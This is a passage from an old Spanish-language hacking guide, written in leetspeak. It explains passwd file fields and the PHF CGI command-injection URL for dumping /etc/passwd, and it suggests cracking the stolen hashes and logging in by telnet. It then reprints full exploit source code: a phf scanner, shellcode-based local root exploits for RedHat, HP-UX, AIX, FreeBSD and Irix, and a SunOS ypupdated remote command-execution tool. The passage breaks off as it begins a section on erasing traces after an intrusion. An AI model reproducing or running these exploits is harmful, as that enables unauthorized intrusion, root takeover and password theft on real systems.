nuucp::10:10:Remote UUCP User:/var/spool/uucppublic:/usr/lib/uucp/uucico
auditor:*:11:0:Audit Activity Owner:/auditor:/bin/sh
dbadmin:*:12:0:Security Database Owner:/dbadmin:/bin/sh
rfindd:*:66:1:Rfind Daemon and Fsdump:/var/rfindd:/bin/sh
guest:zpB5nSLLjDOx2:998:998:Guest Account:/usr/people/guest:/bin/csh
4Dgifts::999:998:4Dgifts Account:/usr/people/4Dgifts:/bin/csh
will:5fg63fhD3d5gh:9406:12:Will Spencer:/home/fsg/will:/bin/bash

Donde cada campo viene separado por : y en los que el significado de
cada campo es:
Login: will
Password encriptado: 5fg63fhD3d5gh
Numero de identificacion del usuario (UID): 9406
Numero de identificacion del grupo al que pertenece (GID): 12
Nombre real: Will Spencer
Directorio Home: /home/fsg/will
Tipo de shell: /bin/bash


* "PHF" --> Es una teknika ke konsiste en kuando estamos utilizando algun
 	navegador komo netscape o internet explorer, nos visualize en una
        pagina web el fichero de passwords del servidor que estemos
        visitando.
	Solo sirve para servidores kon un s.o. unix, el kual es el sistema
        mas utilizado por los servidores ;-)
	Para obtener el fichero de klaves, kargamos nuestro navegador y
        ponemos el url del servidor en kuestion, komo por ejemplo :
        http://xxxxxxxx.xxxx, asi akcederemos a su pagina.
	Kuando ya estamos dentro hay que escribir en la misma linea del url:
        cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd ,por lo tanto a
        nosotros nos quedaria:
	http://xxxxxxxx.xxxx/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
        Donde xxxxxxxx.xxxx, es el url del servidor el cual deseamos
        acceder, y kuando aparece el fichero en la pagina, solo nos keda
        grabarla en nuestro HD y desenkriptar los passwords, para ello
        utilizaremos algun desenkriptador de pass (Te rekomiendo el John
        The Ripper, Lo podras enkontrar en kualkier site)
        Kuando hayamos hayado las klaves, solo nos faltara hacer un telnet
        al mismo servidor y kuando nos pida el login y el password, pos
        pondremos alguno de los ke hemos desenkriptao, y ya estaremos dentro.XD
	En kaso que no sepais la direccion telnet, trankilos, seguramente el
        url os la pueda proporcionar o mirar abajo a la izkierda del
        navegador a que makina se esta konectando y ya esta.
        
	Bien, aki te paso el kodigo de un programa ke chekea los hosts ke
        pueden tener el bug del phf (Komo mas abajo se explika):

		--------------==Corta aqui==--------------


/* chequea los host que pueden tener el bug del phf */

/*
     phfscan.c
     June, 1996
     By Alhambra
     alhambra@infonexus.com

     A production of The Guild Corporation, 1996

    A quick hack to make scanning for hosts which still have the phf bug.
     Accepts hosts to scan from stdin, and writes whatever it gets back to
     stdout.  Plenty of room for optimization, and features that could be
     added include forking off multiple copies for concurrent scans, etc, etc.
     Do it yourself...that's how you learn.

     The effectiveness of this program for getting password files isn't
     what it once was...we see only around a 30% success ratio at getting
     /etc/passwd from hosts that would have been vulnerable once upon a time.
     But that's still something...

      Use:
    phfscan < infile > outfile

*/
#include <sys/stat.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/syslog.h>
#include <sys/param.h>
#include <sys/times.h>
#ifdef LINUX
#include <sys/time.h>
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/signal.h>
#include <arpa/inet.h>
#include <netdb.h>
int FLAG = 1;
int Call(int signo)
{
 FLAG = 0;
}

main (int argc, char *argv[])
{
  char host[100], buffer[1024], hosta[1024],FileBuf[8097];
  int outsocket, serv_len, len,X,c,outfd;
  struct hostent *nametocheck;
  struct sockaddr_in serv_addr;
  struct in_addr outgoing;

  char PHFMessage[]="GET /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd\n";
  /* yp version...use as needed...*/
/* char PHFMessage[]="GET /cgi-bin/phf?Qalias=x%0a/usr/bin/ypcat%20passwd\n";*/

  while(fgets(hosta,100,stdin))
    {
      if(hosta[0] == '\0')
    break;
      hosta[strlen(hosta) -1] = '\0';
      write(1,hosta,strlen(hosta)*sizeof(char));
    write(1,"\n",sizeof(char));
      outsocket = socket (AF_INET, SOCK_STREAM, 0);
      memset (&serv_addr, 0, sizeof (serv_addr));
      serv_addr.sin_family = AF_INET;

      nametocheck = gethostbyname (hosta);

      /* Ugly stuff to get host name into inet_ntoa form */
      (void *) memcpy (&outgoing.s_addr, nametocheck->h_addr_list[0],
               sizeof (outgoing.s_addr));
      strcpy (host, inet_ntoa (outgoing));
      serv_addr.sin_addr.s_addr = inet_addr (host);
      serv_addr.sin_port = htons (80);
      signal(SIGALRM,Call);
      FLAG = 1;

      alarm(10);

      X=connect (outsocket, (struct sockaddr *) &serv_addr, sizeof (serv_addr));
      alarm(0);

      if(FLAG == 1 && X==0){
       write(outsocket,PHFMessage,strlen(PHFMessage)*sizeof(char));
       while((X=read(outsocket,FileBuf,8096))!=0)
      write(1,FileBuf,X);
    }
      close (outsocket);
    }
  return 0;
}


		--------------==EnD oF CuT==--------------





* "Xploits que te dan Shells y hasta la cuenta de Root" --> Pues bien, komo
   ya se sabra ke es un Xploit (Esta explikado mas arriba), ahi diversos
   Xploits donde estos atakan a bugs del sistema, kon lo ke nos puede
   beneficiar.
   Ya ke estoy haciendo esta especie de "Guia" voy a poner unos kuantos
   Xploits, ke seguramente aun funcionen, para ke os divirtais un rato. }:)                                     

	
* Xploit ke te da privilegios de ROOT en versiones Red Hat 5.0 De linux.

		--------------==Corta aqui==--------------
/*

[ http://www.rootshell.com/ ]

   Just Your Standard EGGSHELL Proggie:
   traceroute buffer overflow exploit for RedHat Linux 5.0
   mostly ripped from Aleph One <aleph1@underground.org>

   Wilton Wong
   wwong@blackstar.net

   gcc -o trace_shell trace_shell.c

*/
#include <stdlib.h>

#define DEFAULT_OFFSET                 0
#define DEFAULT_BUFFER_SIZE            1019
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);
  if (argc > 3) eggsize = atoi(argv[3]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);
 
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,"EGG=",4);
  putenv(egg);
  memcpy(buff,"RET=",4);
  putenv(buff);
  printf("Now run: /usr/sbin/traceroute $RET\n");
  system("/bin/bash");
}
  





-------------------------------------------------------------------------


On Redhat 5.0,

There are also vunerable to buffer overruns in:

/usr/bin/rlogin
/usr/bin/rsh 
/usr/sbin/ping

		--------------==EnD oF CuT==--------------




* Xploit para HP-UX ke te da privilegios de root.

		--------------==Corta aqui==--------------

/***
 *
 * HP-UX /usr/etc/vhe/vhe_u_mnt bug exploit.
 *
 * This bug is exhibited in all versions of HP-UX that contain
 * /usr/etc/vhe/vhe_u_mnt setuid to root.
 *
 * This program written by pluvius@io.org
 * The exploit code itself written by misar@rbg.informatik.th-darmstadt.de
 *
 * I found that the exploit code didn't always work due to a race between
 * the child and the parent, and that a link() called failed due to
 * the fact that user directories and the /tmp are in different file systems
 * so you must create a symlink.
 * I added in a call to alarm() so that the timing between the two processes
 * is ok..
 *
 ***/
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#define BUGGY_PROG "/usr/etc/vhe/vhe_u_mnt"
#define NAME "<defunct>"

int test_host()
{ struct utsname name;
   uname(&name);
   return !strcmp(name.sysname,"HP-UX");
}
int check_mount()
{ struct stat my_buf;
   if (stat(BUGGY_PROG, &my_buf))
      return 0;
   return !((my_buf.st_mode & S_ISUID) != S_ISUID);
}
void pause_handler()
{
   signal(SIGALRM,pause_handler);
}
int rhost_user(user)
char *user;
{
  struct passwd *info;
  char   homedir[80];
  int fd[2];
  int procno;
  struct stat my_buf;
  int fsize;

   info = getpwnam(user);
   if (info==NULL) {
      fprintf(stderr,"ERROR: Unknown user %s\n",user);
      exit(-3);
   }
   strcpy(homedir,info->pw_dir);
   if (homedir[strlen(homedir)-1] != '/')
      strcat(homedir,"/");
   strcat(homedir,".rhosts");

   signal(SIGALRM,pause_handler);
   memset(my_buf,0,sizeof(my_buf));
   stat(homedir,&my_buf);
   fsize = my_buf.st_size;

   /* now the exploit code... slightly modified.. but mostly from the source */
   /* by misar@rbg.informatik.th-darmstadt.de                                */
   pipe(fd);
   if (!(procno=fork())) {
      close(0);
      dup(fd[0]);
      close(fd[1]);
      close(1);
      close(2);
      alarm(2); /* wait for other process */
      nice(5);
      execl(BUGGY_PROG,NAME,NULL);
   } else {
    FILE *out;
    char listfile[25];
    char mntfile[25];
    struct stat dummy;

      close(1);
      dup(fd[1]);
      close(fd[0]);
      write(1,"+\n",2);
      sprintf(listfile,"/tmp/vhe_%d",procno+2);
      sprintf(mntfile,"/tmp/newmnt%d",procno+2);
      while (stat(listfile,&dummy));
      unlink(listfile);
      out=fopen(listfile,"w");
      fputs("+ +\n",out);
      fclose(out);
      unlink(mntfile);
      symlink(homedir,mntfile);
      waitpid(procno,NULL,0);
   }
   stat(homedir,&my_buf);
   return (fsize != my_buf.st_size);
}

void main(argc,argv)
int   argc;
char *argv[];
{
  int i;
  int rhost_root = 0;
  char userid[10];

   if (!test_host()) {
      fprintf(stderr,"ERROR: This bug is only exhibited by HP-UX\n");
      exit(-1);
   }

   if (!check_mount()) {
      fprintf(stderr,
              "ERROR: %s must exist and be setuid root to exploit this bug\n",
              BUGGY_PROG);
      exit(-2);
   }

   for (i=0;(i<5)&&(!rhost_root);i++) {
      fprintf(stderr,"Attempting to .rhosts user root..");
      if (!rhost_user("root")) {
         fprintf(stderr,"failed.\n");
      } else {
         fprintf(stderr,"succeeded\n");
         rhost_root = 1;
      }
   }

   if (!rhost_root) {
      /* failed to rhost root, try user 'bin' */
      fprintf(stderr,"Too many failures.. trying user bin...");
      if (!rhost_user("bin")) {
         fprintf(stderr,"failed.\n");
         exit(-4);
      }
      fprintf(stderr,"succeeded.\n");
      strcpy(userid,"bin");
   } {
      strcpy(userid,"root");
   }
   fprintf(stderr,"now type: \"remsh localhost -l %s csh -i\" to login\n",
           userid);
}

		--------------==EnD oF CuT==--------------

* Xploit ke te da una shell.

		--------------==Corta aqui==--------------

/* dip-exploit.c - overruns the buffer in do_chatkey() to give a shell */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>

#define PATH_DIP "/usr/sbin/dip"

u_char shell[] = /* courtesy of avalon  ;) */
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

u_long esp() { __asm__("movl %esp, %eax"); }

main()
{
  u_char buf[1024];
  u_long addr;
  int i, f;

  strcpy(buf, "chatkey ");
  addr = esp() - 192;
  for (i=8; i<128+16; i+=4)
    *((u_long *) (buf+i)) = addr;
  for (i=128+16; i<512; i++)
    buf[i] = 0x90;
  for (i=0; i<strlen(shell); i++)
    buf[512+i] = shell[i];
  buf[512+i] = '\n';

  if ((f = open("temp.dip", O_WRONLY|O_TRUNC|O_CREAT, 0600)) < 0) {
    perror("temp.dip");
    exit(0);
  }
  write(f, buf, 512+i);
  close(f);

  execl(PATH_DIP, "dip", "temp.dip", (char *)0);
}

		--------------==EnD oF CuT==--------------


* Xploit para AIX 4.2 ke te da privilegios de ROOT

		--------------==Corta aqui==--------------

/* Under AIX 4.2 (probably others) /usr/dt/bin/dtaction does not handle
properly the HOME environment variable and that spawns a root shell. A lot
of other X programs have the same problem and /bin/X11/xlock is well known
to be exploitable.
Tested on AIX 4.2 box.

SOLUTION: #chmod -s /usr/dt/bin/dtaction /bin/X11/xlock
 OR apply patches */

/*
 AIX 4.2,(others?) dtaction and HOME exploit by Georgi Guninski

----------------------------------------
DISCLAIMER

 This program is for educational purpose ONLY. Do not use it without
permission.
 The usual standard disclaimer applies, especially the fact that Georgi
Guninski
 is not liable for any damages caused by direct or  indirect use of
 the information or functionality provided by this program.
 Georgi Guninski, his employer or any Internet provider bears NO
responsibility for content
 or misuse of this program or any derivatives thereof.
 By using this program you accept the fact that any damage (dataloss,
system
 crash, system compromise, etc.) caused by the use of this program is not
 Georgi Guninski's responsibility.

In case you distribute this, please keep the disclaimer and my addresses.
-----------------------------------------
Use the IBM C compiler.
Compile with: cc -g aixdtaction.c
DISPLAY should be set.
SOLUTION: #chmod -s /usr/dt/bin/dtaction                ; at least stops root shells
-----------------
Georgi Guninski
 guninski@hotmail.com
 http://www.geocities.com/ResearchTriangle/1711

Suggestions,comments and job offers are welcome!
10-JUNE-97
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char *prog="/usr/dt/bin/dtaction";
char *prog2="dtaction";
extern int execv();

char *createvar(char *name,char *value)
{
char *c;
int l;
l=strlen(name)+strlen(value)+4;
if (! (c=malloc(l))) {perror("error allocating");exit(2);};
strcpy(c,name);
strcat(c,"=");
strcat(c,value);
return c;
}

/*The program*/
main(int argc,char **argv,char **env)
{
/*The code*/
unsigned int code[]={
0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
0x7c0903a6 , 0x4e800420, 0x0
};
/* disassembly
7c0802a6        mfspr   r0,LR
9421fbb0        stu     SP,-1104(SP) --get stack
90010458        st      r0,1112(SP)
3c60f019        cau     r3,r0,0xf019
60632c48        lis     r3,r3,11336
90610440        st      r3,1088(SP)
3c60d002        cau     r3,r0,0xd002
60634c0c        lis     r3,r3,19468
90610444        st      r3,1092(SP)
3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
6063696e        lis     r3,r3,26990
90610438        st      r3,1080(SP)
3c602f73        cau     r3,r0,0x2f73
60636801        lis     r3,r3,26625
3863ffff        addi    r3,r3,-1
9061043c        st      r3,1084(SP) --terminate with 0
30610438        lis     r3,SP,1080
7c842278        xor     r4,r4,r4    --argv=NULL
80410440        lwz     RTOC,1088(SP)
80010444        lwz     r0,1092(SP) --jump
7c0903a6        mtspr   CTR,r0
4e800420        bctr              --jump
*/

#define MAXBUF 600
unsigned int buf[MAXBUF];
unsigned int frame[MAXBUF];
unsigned int i,nop,mn=100;
int max=280;
unsigned int toc;
unsigned int eco;
unsigned int *pt;
char *t;
unsigned int reta; /* return address */
int corr=3400;
char *args[4];
char *newenv[8];


if (argc>1)
        corr = atoi(argv[1]);

pt=(unsigned *) &execv;
toc=*(pt+1);
eco=*pt;

if ( ((mn+strlen((char*)&code)/4)>max) || (max>MAXBUF) )
{
        perror("Bad parameters");
        exit(1);
}

#define OO 7
*((unsigned short *)code + OO + 2)=(unsigned short) (toc & 0x0000ffff);
*((unsigned short *)code + OO)=(unsigned short) ((toc >> 16) & 0x0000ffff);
*((unsigned short *)code + OO + 8 )=(unsigned short) (eco & 0x0000ffff);
*((unsigned short *)code + OO + 6 )=(unsigned short) ((eco >> 16) &
0x0000ffff);

reta=(unsigned) &buf[0]+corr;

for(nop=0;nop<mn;nop++)
 buf[nop]=0x4ffffb82;
strcpy((char*)&buf[nop],(char*)&code);
i=nop+strlen( (char*) &code)/4-1;

if( !(reta & 0xff) || !(reta && 0xff00) || !(reta && 0xff0000)
        || !(reta && 0xff000000))
{
perror("Return address has zero");exit(5);
}

while(i++<max)
 buf[i]=reta;
buf[i]=0;

for(i=0;i<max-1;i++)
 frame[i]=reta;
frame[i]=0;

/* 4 vars 'cause the correct one should be aligned at 4bytes boundary */
newenv[0]=createvar("EGGSHEL",(char*)&buf[0]);
newenv[1]=createvar("EGGSHE2",(char*)&buf[0]);
newenv[2]=createvar("EGGSHE3",(char*)&buf[0]);
newenv[3]=createvar("EGGSHE4",(char*)&buf[0]);
newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
newenv[5]=createvar("HOME",(char*)&frame[0]);
newenv[6]=NULL;

args[0]=prog2;
puts("Start...");/*Here we go*/
execve(prog,args,newenv);
perror("Error executing execve \n");
/*      Georgi Guninski guninski@hotmail.com
        http://www.geocities.com/ResearchTriangle/1711*/
}

/*
-brute-script----------------------------------------------------------
#!/bin/ksh
L=200
O=40
while [ $L -lt 12000 ]
do
echo $L
L=`expr $L + 96`
./a.out $L
done
*/

		--------------==EnD oF CuT==--------------



* Xploit para FREEBSD ke te da privilegios de ROOT

		--------------==Corta aqui==--------------

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET		50
#define BUFFER_SIZE		256

long get_esp(void)
{
   __asm__("movl %esp,%eax\n");
}

main(int argc, char **argv)
{
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;

/* so you dont have to disassemble it, here is the asm code:
start:
jmp     endofk0dez
realstart:
popl    %esi
leal    (%esi), %ebx
movl    %ebx, 0x0b(%esi)
xorl    %edx, %edx
movl    %edx, 7(%esi)
movl    %edx, 0x0f(%esi)
movl    %edx, 0x14(%esi)
movb    %edx, 0x19(%esi)
xorl    %eax, %eax
movb    $59, %al
leal    0x0b(%esi), %ecx
movl    %ecx, %edx
pushl   %edx
pushl   %ecx
pushl   %ebx
pushl   %eax
jmp     bewm
endofk0dez:
call    realstart
.byte   '/', 'b', 'i', 'n', '/', 's', 'h'
.byte   1, 1, 1, 1
.byte   2, 2, 2, 2
.byte   3, 3, 3, 3
bewm:
.byte   0x9a, 4, 4, 4, 4, 7, 4
*/
   
   char execshell[] =
   "\xeb\x23"
   "\x5e"
   "\x8d\x1e"
   "\x89\x5e\x0b"
   "\x31\xd2"
   "\x89\x56\x07"
   "\x89\x56\x0f"
   "\x89\x56\x14"
   "\x88\x56\x19"
   "\x31\xc0"
   "\xb0\x3b"
   "\x8d\x4e\x0b"
   "\x89\xca"
   "\x52"
   "\x51"
   "\x53"
   "\x50"
   "\xeb\x18"
   "\xe8\xd8\xff\xff\xff"
   "/bin/sh"
   "\x01\x01\x01\x01"
   "\x02\x02\x02\x02"
   "\x03\x03\x03\x03"
   "\x9a\x04\x04\x04\x04\x07\x04";
   
   int i;
   int ofs = DEFAULT_OFFSET;

   /* if we have a argument, use it as offset, else use default */
   if(argc == 2)
      ofs = atoi(argv[1]);   
   /* print the offset in use */
   printf("Using offset of esp + %d (%x)\n", ofs, get_esp()+ofs);
   
   buff = malloc(4096);
   if(!buff)
   {
      printf("can't allocate memory\n");
      exit(0);
   }
   ptr = buff;
   /* fill start of buffer with nops */
   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
   ptr += BUFFER_SIZE-strlen(execshell);
   /* stick asm code into the buffer */
   for(i=0;i < strlen(execshell);i++) 
      *(ptr++) = execshell[i];
   /* write the return addresses
   **
   ** return address				4
   ** ebp					4
   ** register unsigned n			0
   ** register char *cp				0
   ** register struct syment *s			0
   **
   ** total: 8
   */
   addr_ptr = (long *)ptr;
   for(i=0;i < (8/4);i++)
      *(addr_ptr++) = get_esp() + ofs;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   execl("/usr/bin/rdist", "rdist", "-d", buff, "-d", buff, NULL);
}

		--------------==EnD oF CuT==--------------




* Xploit para Irix 5.3, Irix64 6.2, Irix 6.3, ke te da privilegios de ROOT

		--------------==Corta aqui==--------------


/* /bin/login exploit by DCRH 24/5/97
 *
 * Tested on:   R3000 Indigo (Irix 5.3)
 *              R4400 Indy (Irix 5.3)
 *              R5000 O2 (Irix 6.3)
 *              R8000 Power Challenge (Irix 6.2)
 *
 * Compile as: cc -n32 login.c     (for Irix 6.x)
 *             cc login.c          (for Irix 5.x)
 *
 * Press enter when prompted for a password
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      200
#define EXTRA           300
#define OFFSET          0x1b0
#define IRIX_NOP        0x03e0f825    /* move $ra,$ra */

#define u_long unsigned

u_long get_sp_code[] = {
    0x03a01025,         /* move $v0,$sp         */
    0x03e00008,         /* jr $ra               */
    0x00000000,         /* nop                  */
};

u_long irix_shellcode[] = {
    0x24041234,         /* li $4,0x1234         */
    0x2084edcc,         /* sub $4,0x1234        */
    0x0491fffe,         /* bgezal $4,pc-4       */
    0x03bd302a,         /* sgt $6,$sp,$sp       */
    0x23e4012c,         /* addi $4,$31,264+36   */
    0xa086feff,         /* sb $6,-264+7($4)     */
    0x2084fef8,         /* sub $4,264           */
    0x20850110,         /* addi $5,$4,264+8     */
    0xaca4fef8,         /* sw $4,-264($5)       */
    0xaca6fefc,         /* sw $4,-260($5)       */
    0x20a5fef8,         /* sub $5, 264          */
    0x240203f3,         /* li $v0,1011          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x2f62696e,         /* "/bin"               */
    0x2f7368ff,         /* "/sh"                */
};

char buf[BUF_LENGTH + EXTRA + 8];

void main(int argc, char **argv)
{
    char *env[] = {NULL};
    u_long targ_addr, stack;
    u_long *long_p;
    int i, code_length = strlen((char *)irix_shellcode)+1;
    u_long (*get_sp)(void) = (u_long (*)(void))get_sp_code;

    stack = get_sp();

    long_p =(u_long *)  buf;
    targ_addr = stack + OFFSET;

    if (argc > 1)
      targ_addr += atoi(argv[1]);

    while ((targ_addr & 0xff000000) == 0 ||
           (targ_addr & 0x00ff0000) == 0 ||
           (targ_addr & 0x0000ff00) == 0 ||
           (targ_addr & 0x000000ff) == 0)
      targ_addr += 4;

    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = IRIX_NOP;

    for (i = 0; i < code_length/sizeof(u_long); i++)
        *long_p++ = irix_shellcode[i];

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = (targ_addr << 24) | (targ_addr >> 8);

    *long_p = 0;

    printf("stack = 0x%x, targ_addr = 0x%x\n", stack, targ_addr);

    execle("/bin/login", "login", "-h", &buf[1], 0, env);
    perror("execl failed");
}

		--------------==EnD oF CuT==--------------




* Xploit para SunOS 4.1.X, adivina lo ke hace este otro¿? };o)

		--------------==Corta aqui==--------------



                      Avalon Security Research
                            Release 1.0
                            (ypupdated)

Affected Program: rpc.ypupdated

Tested Operating Systems: SunOS 4.1.X

Affect: Remote users may pass arbitrary root commands on target
hosts running ypupdated and keyserv.

Bug Synopsis:
     When ypupdated recieves requests to update yp maps on a host machine
     it forks and executes a copy of the bourne shell. Through the bourne
     shell meta characters may be passed into the arguments causing a
     security breach.

All responses may be directed to mcpheea@cadvision.com

------------------------------------------------------------------------------
Makefile
------------------------------------------------------------------------------
OBJS= slammer.o

all: slammer

slammer: $(OBJS)
        rpcgen ygyg.x
        cc $(OBJS) ygyg_xdr.c -lrpcsvc -o slammer

-------------------------------------------------------------------------------
 /* slammer.c
 *    By Josh D. February 7th 1994 AD
 *    usage slammer target "cmd arg1 arg2 agr3 ....."
 *    the target must be running ypupdated
 *    keyserv, and ypbind MUST be running, if they aren't see README.
 *    this program is built to run on a sunOS 4.1.X machine, running
 *    it on anything else will probably cause a linker error or a core dump
 *    if the program core dumps on a sunos 4.1.X someone has given you
 *    a broken copy or your local machine is not setup correctly (see
 *    README)
 *    caveat: your command will be exec'd on the receiving end of a pipe
 *    so redirecting stdin will cause the input file to be zero'd
 *    example: slammer joe.target.com "mail me@mysite.com < /etc/passwd"
 *    will not only not work, but will also zero the passwd file
 *    solution: use only non-interactive commands, e.g. rm, cp, chmod, mv, etc.
 *    -SW
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <rpc/rpc.h>
#include "ypupdate_prot.h"

char *stump = "nobody c3d91f44568fbbefada50d336d9bd67b16e7016f987bb607\
:7675cd9b8753b5db09dabf12da759c2bd1331c927bb322861fffb54be13f55e9";


int main(argc, argv)
int argc;
char **argv;
{


   ypupdate_args stam;
   CLIENT *yope;
   int ursuck=RPC_ANYSOCK;
   struct hostent *ham;
   unsigned long othello;
   struct sockaddr_in *us, them;
   struct timeval fore;
   char wonthirtyseven[255-1+2 % 1000];
   fore.tv_sec = 60; fore.tv_usec = 0;

   if (argc != 3) exit(printf("wonthirtyseven\n"));

   if (isdigit(argv[1][0]))
   {  bcopy(inet_addr(argv[1]), &them.sin_addr.s_addr, 4);}
   else
   {  ham = gethostbyname(argv[1]);
      if (ham == NULL) exit(printf("ham!!!!!!!!!!!!\n"));
      bcopy(ham->h_addr, &them.sin_addr.s_addr, 2*2);
   }

   if (strlen(argv[2]) > 253)
   {  printf("your comm is bein trunc'd to 253\n");
      argv[2][253] = '\0';
   }
   sprintf(wonthirtyseven, "|%s", argv[2]);

   them.sin_family = AF_INET;
   them.sin_port = 0;
   yope = clntudp_create(&them, 100028, 1, fore, &ursuck);
   if (yope == NULL) exit(printf("Cu;dn't create yope\n"));
   clnt_control(yope, CLSET_TIMEOUT, &fore);

   yope->cl_auth = authdes_create("nobody", 600, NULL, NULL);
   if (yope->cl_auth == NULL) exit(printf("won:local site misconfigured\n"));
   if (yope->cl_auth->ah_ops->ah_marshal == NULL)
      exit(printf("too:local site misconfigured\n"));
   stam.mapname = wonthirtyseven;
   stam.key.yp_buf_val =   "blah";
   stam.datum.yp_buf_val = "blah";
   stam.key.yp_buf_len =   5;
   stam.datum.yp_buf_len = 5;

   if(clnt_call(yope, YPU_CHANGE, xdr_ypupdate_args, &stam, xdr_u_int,
                &othello, fore) != RPC_SUCCESS)
      printf("137\n");
}

------------------------------------------------------------------------------
%/* @(#)ypupdate_prot.x 1.5 90/01/03 Copyr 1990, Sun Micro */
%
%/*
% * Compiled from ypupdate_prot.x using rpcgen
% * This is NOT source code!
% * DO NOT EDIT THIS FILE!
% */

/*
 * NIS update service protocol
 */
const MAXMAPNAMELEN = 255;
const MAXYPDATALEN  = 1023;
const MAXERRMSGLEN  = 255;

program YPU_PROG {
        version YPU_VERS {
                u_int YPU_CHANGE(ypupdate_args) = 1;
                u_int YPU_INSERT(ypupdate_args) = 2;
                u_int YPU_DELETE(ypdelete_args) = 3;
                u_int YPU_STORE(ypupdate_args)  = 4;
        } = 1;
} = 100028;

typedef opaque yp_buf<MAXYPDATALEN>;

struct ypupdate_args {
        string mapname<MAXMAPNAMELEN>;
        yp_buf key;
        yp_buf datum;
};

struct ypdelete_args {
        string mapname<MAXMAPNAMELEN>;
        yp_buf key;
};
------------------------------------------------------------------------------
/*
 * Please do not edit this file.
 * It was generated using rpcgen.
 */

#include <rpc/types.h>

/* @(#)ypupdate_prot.x 1.5 90/01/03 Copyr 1990, Sun Micro */

/*
 * Compiled from ypupdate_prot.x using rpcgen
 * This is NOT source code!
 * DO NOT EDIT THIS FILE!
 */
#define MAXMAPNAMELEN 255
#define MAXYPDATALEN 1023
#define MAXERRMSGLEN 255

#define YPU_PROG ((u_long)100028)
#define YPU_VERS ((u_long)1)
#define YPU_CHANGE ((u_long)1)
extern u_int *ypu_change_1();
#define YPU_INSERT ((u_long)2)
extern u_int *ypu_insert_1();
#define YPU_DELETE ((u_long)3)
extern u_int *ypu_delete_1();
#define YPU_STORE ((u_long)4)
extern u_int *ypu_store_1();

typedef struct {
        u_int yp_buf_len;
        char *yp_buf_val;
} yp_buf;
bool_t xdr_yp_buf();

struct ypupdate_args {
        char *mapname;
        yp_buf key;
        yp_buf datum;
};
typedef struct ypupdate_args ypupdate_args;
bool_t xdr_ypupdate_args();

struct ypdelete_args {
        char *mapname;
        yp_buf key;
};
typedef struct ypdelete_args ypdelete_args;
bool_t xdr_ypdelete_args();
------------------------------------------------------------------------
README
-------------------------------------------------------------------------

In order for slammer to work correctly the following parameters must be met:

Target Host *MUST* be running both ypupdated and keyserv. If this is not the
case Slammer will return non-zero error code.

syntax: slammer target.com "arbitrary command"

If slammer is succesfull you will be returned to your initial prompt.

Avalon Security Research

Josh D.
Ben G.
Alfred H.


******************************************************************************
"Freedom is a meal easy to eat, but difficult to digest". Rosseau
 Send all replies to mcpheea@cadvision.com
******************************************************************************


		--------------==EnD oF CuT==--------------




_  Borrando tus Huellas;
Este apartado es muy importante ke lo entiendas, ya ke kuando entres en una
makina, y empiezas a ejecutar komandos y a moverte de un lado a otro de la
